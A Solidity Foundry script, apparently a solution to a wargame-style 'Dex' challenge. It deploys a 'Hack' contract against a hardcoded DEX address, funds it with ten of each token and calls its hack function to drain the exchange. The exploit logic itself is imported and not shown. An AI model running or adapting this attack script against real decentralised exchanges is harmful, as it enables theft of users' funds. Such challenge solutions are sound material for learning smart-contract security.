// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import {Hack} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Deploy is Script {
    Hack hack;
    address dexContract = 0xC4a97d76d07bf000ae70C61F6937aFC2b530cdaf;
    function run() public {
    Dex dex = Dex(dexContract);
    address token1 = dex.token1();
    address token2 = dex.token2();

    vm.startBroadcast();

    hack = new Hack(dexContract);

    IERC20(token1).transfer(address(hack), 10);
    IERC20(token2).transfer(address(hack), 10);

    hack.hack();

    vm.stopBroadcast();
    }
}

